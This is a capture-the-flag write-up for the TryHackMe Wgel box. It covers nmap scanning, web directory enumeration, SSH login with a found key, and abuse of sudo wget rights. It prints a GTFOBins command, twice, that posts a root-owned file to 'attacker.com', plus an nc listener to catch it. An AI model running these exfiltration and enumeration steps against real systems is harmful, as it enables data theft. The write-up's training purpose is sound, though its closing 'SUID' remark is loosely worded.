# TryHackMe - Wgel CTF Writeup

## Tools used:

1. Nmap
2. Dirsearch
3. Gobuster
4. GTFOBins

## Scanning and Enumeration

NOTE: The machine's IP will be represented as **"10.10.x.x"** due to different IP's given by TryHackMe

Assuming you already have the machine's IP, run 4 Nmap scans to scan and enumerate the box

### Half TCP Scan

```
nmap -n -sS -vv -T5 -p 1-20000 10.10.x.x -oN Half-TCP.txt
```

### Version scan / Banner grabbing

```
nmap -sV --version-all -vv -T5 -p 22,80 10.10.x.x -oN Version-scan.txt
```

### Aggressive scan

```
nmap -A -vv -T5 10.10.x.x -oN Aggressive-scan.txt
```

### Nmap NSE vulnerability scan

```
nmap --script vuln -p 80 10.10.x.x -oN nse-vuln.txt
```

The main interest here is the Half TCP and NSE scan. From the Half TCP scan, you'd see how many ports are open and for the NSE scan you'd see kind of an "outline" on what this port/service is vulnerable to.

From this point on, there isn't that much to explore here on the outside of the box.  
Shift your focus to the website hosted on port 80.

## Enumeration of the website

After visiting the website, you'd see a Apache2 Ubuntu default page and ignore the page and immediately enumerate the website.

The choice is up to you if you want to use Dirsearch or Gobuster but I personally use Gobuster but nonetheless here are the commands.

### Dirsearch

```
dirsearch -u http://10.10.x.x/ -t 120
```

### Gobuster

```
gobuster dir -u http://10.10.x.x/ -x /path/to/wordlist/ -X /path/to/extension/wordlist -t 120
```

For people that are gonna ask why I have my extensions in a file, it's much better and I can make sure I don't miss out any file extension when enumerating.

After enumerating, the only accessible directory that you should see there is: http://10.10.x.x/sitemap/  
Go to that directory and you'll see a sort of a web page.

Going back to the first step, you should enumerate the website using either Dirsearch and Gobuster to find accessible files and directories.

While running Dirsearch or Gobuster, inspect the HTML source code of http://10.10.x.x/sitemap/ as it contains a username.  
After Dirsearch and Gobuster scans, you should see a /.ssh/ file, save it and login to SSH.

## SSH login and Privilege Escalation

After logging in to SSH, immediately extract the user flag on the /Documents/ directory if I'm not mistaken.  

For Privilege Escalation, if you run the command:

```
sudo -l
```

You'd see that the user is allowed to run wget with elevated privileges, to exploit this run the command below: 

```
URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
```
What the exploit means is that the **"--post-file"** option sends the contents of the file to the listening IP and port using the HTTP Post request.

Replace the URL variable with your listening IP and port, the LFILE with the file to read then enter the command line by line to the terminal. DON'T COPY AND PASTE IT STRAIGHT FROM GTFOBINS TO THE TERMINAL.

Before hitting "Enter", setup a listener on your Kali Linux Box.  
Use either of the two:

```
nc -lvnp 9999
```

```
ncat -lvnp 9999
```

After setting up the listeners, hit enter and you should see the root flag sent to your box.

## Conclusion

If there is anything that we both have learned today, it's that we can read and send the contents of a file to our box using the HTTP Post request by using the commmand below:

```
URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
```

We did not escalate our privileges, however, we did take advantage/abuse SUID privileges to read the contents of restricted files.
